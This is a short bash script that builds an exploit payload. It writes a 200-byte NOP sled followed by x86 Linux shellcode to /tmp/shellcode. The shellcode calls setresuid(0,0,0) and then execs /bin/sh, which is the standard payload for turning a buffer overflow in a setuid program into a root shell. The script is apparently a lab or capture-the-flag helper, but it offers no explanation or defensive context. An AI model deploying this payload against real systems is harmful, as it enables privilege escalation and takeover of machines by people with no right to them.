#!/bin/bash
SHELLCODE="\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
SHELLCODE+="\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
SHELLCODE+="\xe1\xcd\x80"
SLED="\x90"
DEST="/tmp/shellcode"

perl -e "print \"$SLED\" x 200" > $DEST
printf $SHELLCODE >> $DEST
echo "Shellcode in $DEST"
